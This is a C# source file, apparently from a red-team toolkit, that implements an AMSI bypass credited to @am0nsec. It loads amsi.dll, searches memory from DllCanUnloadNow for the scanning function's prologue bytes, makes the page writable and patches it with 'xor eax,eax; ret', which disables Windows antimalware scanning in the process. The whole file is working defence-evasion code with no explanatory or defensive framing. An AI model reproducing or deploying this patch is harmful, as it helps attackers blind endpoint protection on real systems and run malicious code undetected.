using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace AddReferenceDotRedTeam
{
    class AMSI_ByPass
    {

            [DllImport("kernel32")]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            private static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            public static void ByPassAMSI()
            {
                Console.WriteLine("-- AMSI Patching");
                Console.WriteLine("-- Paul Laîné (@am0nsec)\n");

                // Get the DllCanUnload function address
                IntPtr hModule = LoadLibrary("amsi.dll");
                Console.WriteLine("[+] AMSI DLL handle: " + hModule);

                IntPtr dllCanUnloadNowAddress = GetProcAddress(hModule, "DllCanUnloadNow");
                Console.WriteLine("[+] DllCanUnloadNow address: " + dllCanUnloadNowAddress);

                // Dynamically get the address of the function to patch
                byte[] egg = { };
                if (IntPtr.Size == 8)
                {
                    egg = new byte[] {
                    0x4C, 0x8B, 0xDC,       // mov     r11,rsp
                    0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
                    0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
                    0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi
                    0x57,                   // push    rdi
                    0x41, 0x56,             // push    r14
                    0x41, 0x57,             // push    r15
                    0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h
                };
                }
                else
                {
                    egg = new byte[] {
                    0x8B, 0xFF,             // mov     edi,edi
                    0x55,                   // push    ebp
                    0x8B, 0xEC,             // mov     ebp,esp
                    0x83, 0xEC, 0x18,       // sub     esp,18h
                    0x53,                   // push    ebx
                    0x56                    // push    esi
                };
                }
                IntPtr address = FindAddress(dllCanUnloadNowAddress, egg);
                Console.WriteLine("[+] Targeted address: " + address);

                // Change the memory protection of the memory region 
                // PAGE_READWRITE = 0x04
                uint oldProtectionBuffer = 0;
                VirtualProtect(address, (UIntPtr)2, 4, out oldProtectionBuffer);

                // Patch the function
                byte[] patch = { 0x31, 0xC0, 0xC3 };
                Marshal.Copy(patch, 0, address, 3);

                // Reinitialise the memory protection of the memory region
                uint a = 0;
                VirtualProtect(address, (UIntPtr)2, oldProtectionBuffer, out a);
            }

            private static IntPtr FindAddress(IntPtr address, byte[] egg)
            {
                while (true)
                {
                    int count = 0;

                    while (true)
                    {
                        address = IntPtr.Add(address, 1);
                        if (Marshal.ReadByte(address) == (byte)egg.GetValue(count))
                        {
                            count++;
                            if (count == egg.Length)
                                return IntPtr.Subtract(address, egg.Length - 1);
                        }
                        else
                        {
                            break;
                        }
                    }
                }
            }
        }
    }
